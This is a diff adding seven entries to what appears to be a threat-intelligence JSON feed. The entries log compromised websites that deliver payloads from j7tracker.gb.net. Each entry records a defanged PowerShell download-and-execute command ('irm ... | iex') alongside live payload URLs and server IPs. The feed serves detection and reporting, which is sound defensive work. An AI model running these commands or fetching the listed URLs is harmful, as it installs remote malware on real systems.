@@ -530,5 +530,138 @@
     ],
     "ReportId": "cmwow40wj21c40omld6rz6mbi",
     "ScannedAt": "2026-11-20T11:22:48.383000+00:00"
+  },
+  {
+    "UrlDomain": "tekstar.org",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/3f4f577a85637ebd"
+    ],
+    "IP": [
+      "212.58.20.131"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/3f4f577a85637ebd')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/3f4f577a85637ebd"
+    ],
+    "ReportId": "cmwp0ki1u21zq0omlpr10k1od",
+    "ScannedAt": "2026-11-20T13:27:35.582000+00:00"
+  },
+  {
+    "UrlDomain": "mb-groupe.fr",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/ad7ecb0a90af78ea"
+    ],
+    "IP": [
+      "217.160.0.34"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/ad7ecb0a90af78ea')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/ad7ecb0a90af78ea"
+    ],
+    "ReportId": "cmwp0jnub21z10omlro0m9dms",
+    "ScannedAt": "2026-11-20T13:26:56.442000+00:00"
+  },
+  {
+    "UrlDomain": "www.aroma-caffe.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/8fb0bb4d10428484"
+    ],
+    "IP": [
+      "86.107.32.103"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/8fb0bb4d10428484')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/8fb0bb4d10428484"
+    ],
+    "ReportId": "cmwp0j9zl21y00omldz03an97",
+    "ScannedAt": "2026-11-20T13:26:38.484000+00:00"
+  },
+  {
+    "UrlDomain": "www.infraknit.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/7ec389bcd8531763"
+    ],
+    "IP": [
+      "15.206.15.70"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/7ec389bcd8531763')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/7ec389bcd8531763"
+    ],
+    "ReportId": "cmwp0is4521wu0omlsldpz1lj",
+    "ScannedAt": "2026-11-20T13:26:15.293000+00:00"
+  },
+  {
+    "UrlDomain": "bioreligare.com.br",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/b8c645092d9aa718"
+    ],
+    "IP": [
+      "187.77.49.5"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/b8c645092d9aa718')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/b8c645092d9aa718"
+    ],
+    "ReportId": "cmwp0i47a21vs0omlfnp4umsd",
+    "ScannedAt": "2026-11-20T13:25:44.176000+00:00"
+  },
+  {
+    "UrlDomain": "www.theriseinsight.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/46879f03c1d2f22d"
+    ],
+    "IP": [
+      "88.222.211.39"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/46879f03c1d2f22d')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/46879f03c1d2f22d"
+    ],
+    "ReportId": "cmwp0hzjd21u70omleumc138h",
+    "ScannedAt": "2026-11-20T13:25:38.110000+00:00"
+  },
+  {
+    "UrlDomain": "www.francocadoni.it",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/14a3ad6bb4f6e2d5"
+    ],
+    "IP": [
+      "89.46.108.33"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/14a3ad6bb4f6e2d5')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/14a3ad6bb4f6e2d5"
+    ],
+    "ReportId": "cmwp0hev821tf0oml10q41pwa",
+    "ScannedAt": "2026-11-20T13:25:11.478000+00:00"
   }
 ]
